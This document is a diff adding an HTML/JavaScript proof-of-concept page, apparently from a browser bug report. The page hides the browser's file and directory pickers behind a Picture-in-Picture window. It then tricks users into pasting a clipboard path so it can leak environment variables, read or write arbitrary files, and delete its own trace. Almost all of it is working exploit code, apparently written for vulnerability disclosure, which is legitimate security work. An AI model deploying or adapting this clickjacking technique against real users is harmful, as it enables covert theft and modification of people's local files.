@@ -1,0 +1,170 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+#instructions { text-align: center; margin-top: 150px; font-size: 2em; user-select: none; }
+
+.hide { display: none; }
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div id="mainContent">
+<h1>PoC: File/dir picker obscured by PiP</h1>
+<h2>Leak env vars, read/write files</h2>
+<p>PoC works with showOpenFilePicker(), showSaveFilePicker(), showDirectoryPicker().</p>
+<p>After patch for crbug.com/40076120, PiP obscuring is mitigated only for input type=file element (either by closing or tucking PiP window).</p>
+<p>Variations:
+    <ul>
+        <li><a href="?">Read environment variables</a> (Default)</li>
+        <li><a href="?mode=readfile">Read file at arbitrary location</a></li>
+        <li><a href="?mode=writefile">Write file at arbitrary location</a></li>
+    </ul>
+</p>
+</div>
+
+<p id="instructions">...</p>
+
+<script>
+var searchParams = new URLSearchParams(window.location.search);
+var mode = searchParams.has('mode') ? searchParams.get('mode') : 'readenv';
+var debug = searchParams.get('debug') == '1';
+var isPopup = searchParams.get('popup') == '1';
+
+var getRandomInt = () => {
+    return Math.floor(Math.random() * 10000);
+}
+
+/*** CONFIG ***/
+var filenameToWrite = "%userprofile%\\Music\\ao-hello-from-attacker-"+getRandomInt()+".txt";
+var filenameToRead = "%userprofile%\\Documents\\example.txt"
+/*** CONFIG ***/
+
+var attackCompleted = false;
+
+if (!isPopup) {
+    // Logic for opener
+
+    var newWin;
+    window.addEventListener('keydown', () => {
+        if (!newWin || newWin.closed) {
+            // Not using about:blank because Document PiP opener must have https:// URL
+            newWin = window.open('?popup=1&mode='+mode, 'aotest', 'width=1,height=1,left=9000,top=9000');
+            // newWin.resizeTo(1,1);
+            newWin.resizeTo(500,500);
+            newWin.moveBy(-200,-200);
+        }
+    });
+
+    instructions.innerText = 'Press any key twice\n(or press and hold any key)';
+
+} else {
+    // Logic for popup
+
+    mainContent.classList.add('hide');
+
+    var runningAttack = false;
+
+    var pipWin;
+
+    setTimeout(() => {
+        // Show instructions if we haven't received 2nd keypress
+        if (pipWin) { return; }
+        instructions.innerText = 'Press key once more';
+    }, 1000);
+
+    const pickerOpts = {
+        // startIn doesn't matter
+        startIn: "music",
+        multiple: false,
+    };
+
+    const readFile = (file) => {
+        return new Promise((resolve, reject) => {
+            let reader = new FileReader();
+            reader.onload = () => {
+                resolve(reader.result);
+            };
+            reader.onerror = reject;
+            reader.readAsText(file);
+        });
+    }
+
+    const writeFile = async (fileHandle, contents) => {
+        const writable = await fileHandle.createWritable();
+        await writable.write(contents);
+        await writable.close();
+    }
+
+    window.addEventListener('keydown', async () => {
+        if (runningAttack) { return; }
+        runningAttack = true;
+
+        // show*Picker() call wrapped in async function so we don't wait here,
+        // because we can open PiP window with same user interaction (this seems like a separate bug)
+        (async () => {
+            var randomInt = getRandomInt();
+            var clipboardPayload;
+            if (mode == 'readfile') {
+                clipboardPayload = filenameToRead;
+            } else if (mode == 'writefile') {
+                clipboardPayload = filenameToWrite;
+            } else {
+                clipboardPayload = '%username%-%computername%_'+randomInt+'.txt';
+            }
+            const clipboardItem = new ClipboardItem({"text/plain": clipboardPayload});
+            await navigator.clipboard.write([clipboardItem]);
+
+            setTimeout(() => {
+                if (!pipWin) { return; }
+                // Show instructions on delay to allow picker to open
+                pipWin.instructions.innerText = 'Press Ctrl+V, then enter';
+            }, 1000);
+
+            if (mode == 'readfile') {
+                var fileHandleList = await showOpenFilePicker(pickerOpts);
+                if (fileHandleList?.[0]) {
+                    var fileHandle = fileHandleList[0];
+                    var fileContents = await readFile(await fileHandle.getFile());
+                    window.opener.instructions.innerText = 'Read from file:\n' + fileHandle.name + '\nContents:\n' + fileContents;
+                } else {
+                    window.opener.instructions.innerText = 'No file handle?';
+                }
+            } else {
+                var fileHandle = await showSaveFilePicker(pickerOpts);
+                if (fileHandle) {
+                    if (mode == 'readenv') {
+                        window.opener.instructions.innerText = 'Read env vars:\n' + fileHandle.name;
+                        // Delete file to hide attack
+                        await fileHandle.remove();
+                    } else if (mode == 'writefile') {
+                        await writeFile(fileHandle, 'Hello from attacker. ' + Math.random());
+                        window.opener.instructions.innerText = 'Wrote to file:\n' + filenameToWrite;
+                    }
+                } else {
+                    window.opener.instructions.innerText = 'No file handle?';
+                }
+            }
+            setTimeout(() => {
+                // Close on delay, after file picker is no longer visible
+                window.close();
+            }, 500);
+        })();
+
+        // Slight delay to ensure file picker activation checks pass before opening PiP
+        setTimeout(async () => {
+            pipWin = await documentPictureInPicture.requestWindow({width: 9000, height: 9000, disallowReturnToOpener: true, preferInitialWindowPlacement: true});
+            pipWin.document.body.innerHTML = `<style>html { font-family: sans-serif; } #instructions { text-align: center; margin-top: 100px; font-size: 2em; }</style>
+                                              <p id="instructions">Please wait...</p>`;
+        }, 100);
+    });
+
+    setInterval(() => {
+        // Self-close popup if opener is reloaded or closed
+        if (!window.opener?.newWin) { window.close(); }
+    }, 800);
+}
+</script>
+</body>
+</html>
